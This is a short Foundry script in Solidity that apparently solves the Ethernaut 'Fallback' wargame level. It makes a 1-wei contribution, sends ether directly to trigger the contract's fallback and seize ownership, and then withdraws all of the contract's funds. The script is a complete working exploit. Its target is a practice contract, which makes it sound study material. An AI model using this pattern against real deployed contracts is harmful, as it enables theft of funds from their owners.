// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackinstance = Fallback(payable(0x9025D8f329D641831E546b29f0d000C03c13C54d));

    function run() external {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        fallbackinstance.contribute{value: 1 wei}();
        address(fallbackinstance).call{value: 1 wei}("");
        console.log("New owner: ", fallbackinstance.owner());
        console.log("My address", vm.envAddress("MY_WALLET_ADDRESS"));
        fallbackinstance.withdraw();
        vm.stopBroadcast();
    }
}
